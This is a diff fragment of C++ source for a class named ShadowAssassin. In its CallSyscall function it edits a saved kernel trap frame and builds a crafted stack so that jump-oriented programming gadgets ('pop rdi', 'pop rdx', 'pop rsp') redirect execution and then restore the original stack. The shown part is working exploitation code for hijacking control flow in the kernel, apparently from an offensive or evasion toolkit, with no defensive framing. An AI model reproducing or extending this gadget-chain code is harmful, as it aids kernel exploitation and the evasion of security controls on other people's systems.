@@ -403,26 +403,26 @@ UINT64 ShadowAssassin::CallSyscall(const std::string& name, const std::vector<UI
 
 	frameManager.WriteRegister("rax", jopManager.GetRax());
 	frameManager.WriteRegister("rsi", jopManager.GetRsi());
-	frameManager.WriteRegister("rdx", jopManager.GetRdx()); // set directly — skip gadget2
-	frameManager.WriteRegister("rdi", jopManager.GetRdiForJmp());
+	// rdi set by stack via "pop rdi" setup gadget — non-volatile, survives function call
+	// rdi not via trap frame (SYSRET doesn't restore non-volatile regs from KTRAP_FRAME)
 	frameManager.WriteRegister("rip", jopManager.GetRip());
 
-	// 3 trash pops clear home slots 1-3; gadget2 pops rdx from slot 4 [+0x50].
-	// [+0x30] = call return addr   (function entry RSP = newRsp+0x30)
-	// [+0x38] = home slot 1  → pop_rdi
-	// [+0x40] = home slot 2  → pop_rcx
-	// [+0x48] = home slot 3  → pop_rbx
-	// [+0x50] = GetRdx()     → gadget2 pop rdx  (home slot 4, hope R9 isn't spilled)
-	// [+0x58] = originalRsp  → gadget4 pop rsp
+	// Stack layout — old working layout + rdiForJmp on top:
+	//   RSP = newRsp+0x30
+	//   [+0x30] = rdiForJmp       ← setup gadget pop rdi reads this, then call uses [+0x30] for ret addr
+	//   [+0x38..+0x50] = home slots 1-4 (function clobbers, trash pops discard)
+	//   [+0x58] = GetRdx()        ← gadget2 pops rdx from here ✓
+	//   [+0x60] = originalRsp     ← gadget4 pop rsp (same slot that worked before) ✓
 	UINT64 originalRsp = frameManager.ReadStoredRegister("rsp");
-	UINT64 newRsp = originalRsp - 0x400;
+	UINT64 newRsp = originalRsp - 0x800; // 2KB below — below the kernel's resume stack usage
 
-	writeFn(newRsp + 0x60, originalRsp);       // gadget4 pop rsp
-	writeFn(newRsp + 0x58, jopManager.GetRdx()); // gadget2 pop rdx (after 4 trash pops)
+	writeFn(newRsp + 0x60, originalRsp);
+	writeFn(newRsp + 0x58, jopManager.GetRdx());
+	writeFn(newRsp + 0x30, jopManager.GetRdiForJmp()); // setup gadget pops rdi from here
 
-	frameManager.WriteRegister("rsp", newRsp + 0x38);
-	DbgLog("[CallSyscall] rsp=0x%llX rdx@+0x50=0x%llX orig@+0x58\n",
-		newRsp + 0x38, jopManager.GetRdx());
+	frameManager.WriteRegister("rsp", newRsp + 0x30);
+	DbgLog("[CallSyscall] rsp=0x%llX rdi@+0x30=0x%llX rdx@+0x58=0x%llX orig@+0x60=0x%llX\n",
+		newRsp + 0x30, jopManager.GetRdiForJmp(), jopManager.GetRdx(), originalRsp);
 
 
     UINT64 current_rip = frameManager.ReadRegister("rip");
